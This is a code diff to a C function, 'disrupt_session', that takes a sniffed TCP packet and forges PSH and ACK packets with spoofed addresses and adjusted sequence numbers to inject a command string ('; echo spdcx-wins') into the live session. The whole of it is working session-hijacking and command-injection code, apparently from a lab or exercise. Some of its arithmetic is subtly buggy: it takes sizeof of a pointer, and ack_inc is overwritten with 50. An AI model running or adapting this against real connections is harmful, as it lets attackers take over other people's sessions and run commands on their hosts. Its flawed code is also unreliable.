@@ -82,13 +82,14 @@ void disrupt_session(void *sniffedPacket) {
     void *headerPtr             = sniffedPacket + (ipHeader->ip_hl * 4);
     struct tcphdr *tcpHeader    = (struct tcphdr *)headerPtr;
 
+    char *command = "; echo spdcx-wins\r";
+    int sizeOfPacket = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(command) + 1;
+
     struct sockaddr_in addr_in;
     addr_in.sin_family          = AF_INET;
     addr_in.sin_port            = tcpHeader->source;
     inet_pton(AF_INET, inet_ntoa(ipHeader->ip_src), &(addr_in.sin_addr));
 
-//    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1;
-    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 1;
     void *packet                = malloc(sizeOfPacket);
     uint32_t ack_inc            = 0;       // Amount to increase ack by
     uint32_t seq_inc            = 0;       // Amount to increase seq by
@@ -141,10 +142,9 @@ void disrupt_session(void *sniffedPacket) {
     char *srcAddress = malloc(strlen(srcTemp) + 1);
     strncpy(srcAddress, srcTemp, strlen(srcTemp) + 1);
 
-    int i=1, packetAmount = 16;
+    int i=1, packetAmount = 1;
     while(i <= packetAmount){
 
-        ack_inc++;
         fill_packet(dstAddress,                             // Source IP Address
                     srcAddress,                             // Destination IP Address
                     ntohs(tcpHeader->source),               // Destination Port
@@ -155,15 +155,16 @@ void disrupt_session(void *sniffedPacket) {
                     ntohl(tcpHeader->ack_seq) + seq_inc,    // Sequence Number
                     ntohl(tcpHeader->seq) + ack_inc,        // Acknowledgement Number
                     RESET_OFF,                              // RST Flag
-                    (i == 16) ? "\r\0" : "x",                 // Data
+                    command,                                // Data
                     packet,                                 // Packet to fill
-                    (i == 16) ? sizeOfPacket + 1 : sizeOfPacket);                          // Total size of packet
+                    sizeOfPacket);                          // Total size of packet
 
         // Send out the packet
         printf("Sending PSH Packet %d of %d! Result: %d\n", i, packetAmount, send_packet(sock, packet, addr_in));
+        ack_inc += strlen(command) + 1;
+        ack_inc = 50;
         sleep(1);
 
-        seq_inc++;
         fill_packet(dstAddress,                             // Source IP Address
                     srcAddress,                             // Destination IP Address
                     ntohs(tcpHeader->source),               // Destination Port
@@ -178,13 +179,15 @@ void disrupt_session(void *sniffedPacket) {
                     packet,                                 // Packet to fill
                     sizeOfPacket - 1);                      // Total size of packet
         printf("Sending ACK Packet %d of %d! Result: %d\n", i, packetAmount, send_packet(sock, packet, addr_in));
+        seq_inc += strlen(command) + 1;
         sleep(1);
 
         i++;
+
     }
 
     free(dstAddress);
-    free(srcAddress);
-
+//    free(srcAddress);
+    free(packet);
     exit(0);
 }
